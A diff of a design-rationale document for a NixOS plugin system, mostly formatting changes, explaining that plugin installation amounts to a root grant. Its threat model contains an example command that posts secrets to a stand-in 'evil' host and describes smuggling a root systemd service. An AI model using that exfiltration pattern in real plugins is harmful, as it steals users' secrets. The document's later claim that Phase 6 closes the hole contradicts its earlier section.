@@ -7,7 +7,7 @@ rationale. Update this doc when a decision changes; don't rewrite history
 Target audience: anyone revisiting "why is the plugin system shaped like
 this?" months from now.
 
-> Looking to *write* a plugin rather than understand the design?
+> Looking to _write_ a plugin rather than understand the design?
 > See [`../plugin-authoring.md`](../plugin-authoring.md) for the
 > manifest reference, the two-stage ABI, and worked examples.
 
@@ -343,7 +343,7 @@ supply-chain concern or a wider audience.
 Earlier drafts of this entry described `manifest.permissions` as
 "declarative now, enforced later (Phase 6)". That framing was
 wrong: it implied the consent prompt was a step toward sandboxing.
-It isn't, and the planned Phase 6 enforcement *also* wouldn't
+It isn't, and the planned Phase 6 enforcement _also_ wouldn't
 close the hole — see "Why Phase 6 doesn't help" below. This entry
 now documents the actual trust model: **install = root grant,
 consent surfaces metadata + a stark warning, and the only real
@@ -362,7 +362,7 @@ plugin can:
   tree at evaluation time.
 - Declare systemd services, activation scripts, or cron jobs that
   run as root at boot and exfiltrate those secrets (`curl -X POST
-  https://evil/… -d "pw=${config.…}"`).
+https://evil/… -d "pw=${config.…}"`).
 - Use `builtins.readFile` / `builtins.fetchurl` at eval time
   against arbitrary paths.
 
@@ -433,7 +433,7 @@ The `permissions` field stays in the schema for two reasons:
 Earlier drafts of this entry promised that Phase 6 would close
 the hole via per-plugin `DynamicUser` systemd services + scoped
 capability tokens. That's wrong. Per-plugin DynamicUser sandboxes
-the *running services* a plugin declares — so a long-running
+the _running services_ a plugin declares — so a long-running
 plugin daemon can be locked down. But:
 
 1. `plugin.nix` runs at `nixos-rebuild` evaluation time as part
@@ -449,7 +449,7 @@ plugin daemon can be locked down. But:
    time and bake them into the activation script. Sandboxing the
    service after the fact is too late.
 
-The only paths that *would* mitigate `plugin.nix` are
+The only paths that _would_ mitigate `plugin.nix` are
 fundamentally different (sandboxed Nix evaluation, a non-Nix
 plugin DSL, vetted-evaluator pre-flight) — all big architectural
 changes, all invalidating "plugins are NixOS modules". None of
@@ -605,7 +605,7 @@ rebuild."
 
 Some third-party applications (LNBits is the canonical example)
 persist configuration into their own state — a SQLite DB, YAML
-file, etc. — and treat environment variables as *initial* defaults
+file, etc. — and treat environment variables as _initial_ defaults
 only. Once a value is written to the app's own store, changing the
 env var (via the TUI Configure form → Apply → rebuild) has no
 runtime effect: the app reads its own store on startup and ignores
@@ -636,7 +636,7 @@ manage. Guidance, in increasing order of cost:
    Loses anything the user put in the UI; the app re-initializes
    from the fresh env vars.
 
-The plugin manifest has no way to *declare* that a field is
+The plugin manifest has no way to _declare_ that a field is
 UI-persisted today. If this turns out to be common enough that
 authors want to flag it, we'll add a field-level
 `persisted_by: "app"` annotation to the DSL so the TUI can print a
@@ -672,7 +672,7 @@ acceptable, so we reshape the action DSL.
 ### Schema v2 changes
 
 - **`run_as_root` is removed.** Manifests v1 with `run_as_root:
-  true` actions hard-fail at load with a migration-hint error
+true` actions hard-fail at load with a migration-hint error
   message.
 - **Discriminated action types:** an action declares **exactly
   one** of `command:` (runs as the admin user via `bash -c`, no
@@ -706,8 +706,8 @@ D14's threat model is unchanged. A plugin can still smuggle a
 `systemd.services.helpful-service` with `wantedBy = ["multi-user.
 target"]` into its `plugin.nix`; that runs as root automatically
 at every boot, never going through the action DSL or SudoSession.
-Posture A narrows the attack surface for *plugin-supplied actions
-the user runs explicitly*, not for the rebuild-time module
+Posture A narrows the attack surface for _plugin-supplied actions
+the user runs explicitly_, not for the rebuild-time module
 evaluation. Phase 6 (per-plugin systemd users) is what closes the
 deeper hole.
 
